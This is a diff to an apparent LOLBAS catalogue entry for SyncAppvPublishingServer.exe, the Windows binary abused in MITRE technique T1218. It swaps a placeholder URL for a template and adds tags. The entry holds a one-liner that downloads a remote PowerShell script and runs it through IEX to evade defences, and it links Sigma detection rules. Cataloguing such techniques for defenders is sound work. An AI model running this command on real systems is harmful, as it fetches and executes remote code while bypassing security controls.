@@ -1,21 +1,21 @@
 ---
 Name: SyncAppvPublishingServer.exe
 Description: Used by App-v to get App-v server lists
-Author: 'Oddvar Moe'
+Author: Oddvar Moe
 Created: 2018-05-25
 Commands:
-  - Command: SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX"
+  - Command: SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX"
     Description: Example command on how inject Powershell code into the process
     Usecase: Use SyncAppvPublishingServer as a Powershell host to execute Powershell code. Evade defensive counter measures
     Category: Execute
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows 10 1709, Windows 10 1703, Windows 10 1607
+    Tags:
+      - Execute: PowerShell
 Full_Path:
   - Path: C:\Windows\System32\SyncAppvPublishingServer.exe
   - Path: C:\Windows\SysWOW64\SyncAppvPublishingServer.exe
-Code_Sample:
-  - Code:
 Detection:
   - Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/powershell/powershell_script/posh_ps_syncappvpublishingserver_exe.yml
   - Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/powershell/powershell_module/posh_pm_syncappvpublishingserver_exe.yml
